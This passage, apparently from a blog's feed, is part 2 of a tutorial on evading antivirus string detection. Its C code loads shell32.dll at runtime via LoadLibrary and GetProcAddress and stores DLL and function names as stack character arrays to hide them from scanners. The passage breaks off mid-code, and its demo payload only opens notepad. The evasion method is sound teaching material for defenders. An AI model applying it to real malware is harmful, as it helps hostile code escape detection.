&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ExitProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Upon compiling …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In &lt;a href="string-av-evasion-in-x64-assembly-part-1"&gt;my last blog post&lt;/a&gt;, I discussed a way to hide parameter strings from being detected by an anti-virus. The solution was simple and it worked. However, it was incomplete as strings of function calls and loaded DLLs were still detectable in memory.&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-01" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-01.png" /&gt;&lt;/p&gt;
&lt;p&gt;In this post I'll be talking about the other technique from the same &lt;a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/"&gt;blog post&lt;/a&gt; we were following before. It does a good job of explaining the concept which I'll be covering here too. I will also be writing the code in assembly as an added bonus, so we can better understand what goes on under the hood.&lt;/p&gt;
&lt;h2 id="the-problem"&gt;The problem&lt;/h2&gt;
&lt;p&gt;Let's revisit our code from the last time. We have two functions being called &lt;code&gt;ShellExecuteA&lt;/code&gt; and &lt;code&gt;ExitProcess&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;shellapi.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ExitProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Upon compiling the program, the compiler takes the list of all functions used and places them in the executable (In this case, in the &lt;code&gt;.rdata&lt;/code&gt; segment) as a readable string:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-07" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-07.png" /&gt;&lt;/p&gt;
&lt;p&gt;A function name like &lt;code&gt;ShellExecuteA&lt;/code&gt; will be sure to raise some eyebrows so we do not want it to be detectable. To hide this we need to do load the DLL at runtime by using &lt;code&gt;LoadLibrary&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id="coding-in-c"&gt;Coding in C&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;LoadLibrary&lt;/code&gt; accepts a string containing the DLL that we want to load.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LoadLibrary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;shell32.dll&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This loads the DLL's code into memory and returns a handle to that location. We can see the result of this when we look at the memory map in a debugger. Here's the memory map prior to calling &lt;code&gt;LoadLibrary&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-03" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-03.png" /&gt;&lt;/p&gt;
&lt;p&gt;And here's what it looks like after:&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-04" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-04.png" /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;LoadLibrary&lt;/code&gt; API loaded &lt;code&gt;shell32.dll&lt;/code&gt; along with it's dependencies into memory. We can also see that it automatically handled where the new DLLs will be placed. In this case, in between pre-existing ones.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id="aside-how-do-we-know-which-dll-is-needed"&gt;Aside: How do we know which DLL is needed?&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;We can find out which DLL is needed by a function by looking at it's &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"&gt;MSDN documentation&lt;/a&gt;. Scroll at the end of every function documentation to see the "Requirements" section that lists the DLL that it needs.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-02" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-02.png" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;code&gt;LoadLibrary&lt;/code&gt; then returns a &lt;code&gt;HANDLE&lt;/code&gt; object which we can then pass to &lt;code&gt;GetProcAddress&lt;/code&gt;.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GetProcAddress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ShellExecuteA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;code&gt;GetProcAddress&lt;/code&gt; looks through the library we loaded and returns the address of the &lt;code&gt;ShellExecuteA&lt;/code&gt; function. This address needs to be cast to a typedef first before it can be called. This means we need to know the structure of the typedef, which we can determine by looking at the "Syntax" section in MSDN.&lt;/p&gt;
&lt;p&gt;Here's the syntax for &lt;code&gt;ShellExecuteA&lt;/code&gt; according to &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea"&gt;its documentation&lt;/a&gt;:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;HINSTANCE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HWND&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;hwnd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpOperation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpFile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpParameters&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;optional&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;in&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;nShowCmd&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And here's our typedef implementation:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;typedef&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HINSTANCE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HWND&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;hwnd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpOperation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpFile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpParameters&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;nShowCmd&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When everything is setup properly, the variable &lt;code&gt;fShellExecuteA&lt;/code&gt; can now be used as a function.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Combining these together, this is what our code will look like:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;

&lt;span class="k"&gt;typedef&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;HINSTANCE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HWND&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="n"&gt;hwnd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpOperation&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpFile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpParameters&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;LPCSTR&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lpDirectory&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;INT&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;nShowCmd&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;HANDLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LoadLibrary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;shell32.dll&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fShellExecuteA&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;_ShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;GetProcAddress&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hShell32&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;ShellExecuteA&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fShellExecuteA&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;open&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_notepad&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SW_SHOW&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ExitProcess&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This is not yet done, however, as &lt;code&gt;strings.exe&lt;/code&gt; can still detect our strings. This is because we now have strings "shell32.dll" and "ShellExecuteA" as parameters for &lt;code&gt;LoadLibrary&lt;/code&gt; and &lt;code&gt;GetProcAddress&lt;/code&gt;. And these are placed in the &lt;code&gt;.data&lt;/code&gt; segment in memory.&lt;/p&gt;
&lt;p&gt;&lt;img alt="string-anti-virus-evasion-in-x64-assembly-part-2-05" src="https://www.accidentalrebel.com/images/string-anti-virus-evasion-in-x64-assembly-part-2-05.png" /&gt;&lt;/p&gt;
&lt;p&gt;This is where we can use the technique that we used in &lt;a href="string-av-evasion-in-x64-assembly-part-1"&gt;part 1&lt;/a&gt;. By declaring the string as an array as a local variable, the data is placed on the stack instead of in the &lt;code&gt;.data&lt;/code&gt; segment. &lt;/p&gt;
&lt;p&gt;Applying this technique gives us the following:&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ca_shell32&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;s&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;l&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span 